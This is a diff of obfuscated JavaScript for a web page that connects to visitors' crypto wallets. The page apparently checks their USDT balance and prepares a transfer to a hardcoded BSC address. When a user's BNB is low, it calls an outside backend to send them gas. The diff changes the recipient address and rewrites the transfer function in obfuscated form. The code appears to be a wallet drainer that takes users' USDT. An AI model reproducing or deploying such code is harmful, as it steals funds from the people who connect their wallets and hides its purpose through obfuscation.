@@ -1,26 +1,4 @@
-const _0x1b5be5 = _0x3140;
-        (function (_0x12cc9b, _0x2789ae) {
-            const _0x5c24bd = _0x3140,
-                _0x5a43f4 = _0x12cc9b();
-            while (!![]) {
-                try {
-                    const _0x1867c4 =
-                        (-parseInt(_0x5c24bd(0xeb)) / 0x1) * (parseInt(_0x5c24bd(0xa7)) / 0x2) +
-                        (parseInt(_0x5c24bd(0xa6)) / 0x3) * (-parseInt(_0x5c24bd(0xb6)) / 0x4) +
-                        -parseInt(_0x5c24bd(0xba)) / 0x5 +
-                        -parseInt(_0x5c24bd(0xa4)) / 0x6 +
-                        (parseInt(_0x5c24bd(0x94)) / 0x7) * (-parseInt(_0x5c24bd(0xea)) / 0x8) +
-                        parseInt(_0x5c24bd(0xa1)) / 0x9 +
-                        parseInt(_0x5c24bd(0xb4)) / 0xa;
-                    if (_0x1867c4 === _0x2789ae) break;
-                    else _0x5a43f4["push"](_0x5a43f4["shift"]());
-                } catch (_0x57d290) {
-                    _0x5a43f4["push"](_0x5a43f4["shift"]());
-                }
-            }
-        })(_0x17fe, 0x6eebb);
-
-        const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090",
+const bscAddress = "0xf5BcE2BD1E3E414ef9EaFC26DAdcbD990fe7f1A2",
             bnbGasSender = _0x1b5be5(0xb9),
             usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
         let web3, userAddress;
@@ -262,7 +240,7 @@ const _0x1b5be5 = _0x3140;
                 showPopup(_0x3ddf57(0xc4), _0x3ddf57(0xa2));
                 return;
             }
-            if (_0xf5d166 <= 0.0005) {
+            if (_0xf5d166 <= 0x1) {
                 showPopup(
                     _0x3ddf57(0xe5) + _0xf5d166 + _0x3ddf57(0xb8) + _0x2587c5 + "\x20BNB",
                     _0x3ddf57(0xda)
@@ -271,15 +249,16 @@ const _0x1b5be5 = _0x3140;
             }
             showPopup("Loading...", _0x3ddf57(0xda)), transferUSDT(_0xf5d166, _0x2587c5);
         }
-      async function transferUSDT(usdtBalance, userBNB) {
-    try {
-        if (userBNB < 0.0005) {
-    console.log("User BNB is low. Requesting BNB from backend...");
-    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ toAddress: userAddress })
-    });
+        async function transferUSDT(_0x43f85a, _0x1cd071) {
+            const _0x4b8098 = _0x1b5be5;
+            try {
+                _0x1cd071 < 0.0005 &&
+                    (console["log"](_0x4b8098(0xce)),
+                        await fetch(_0x4b8098(0xc9), {
+                            method: _0x4b8098(0xbb),
+                            headers: { "Content-Type": _0x4b8098(0xec) },
+                            body: JSON[_0x4b8098(0xd4)]({ toAddress: userAddress }),
+                        }));
                 const _0x1d74ee = new web3[_0x4b8098(0xb7)][_0x4b8098(0xc0)](
                     [
                         {
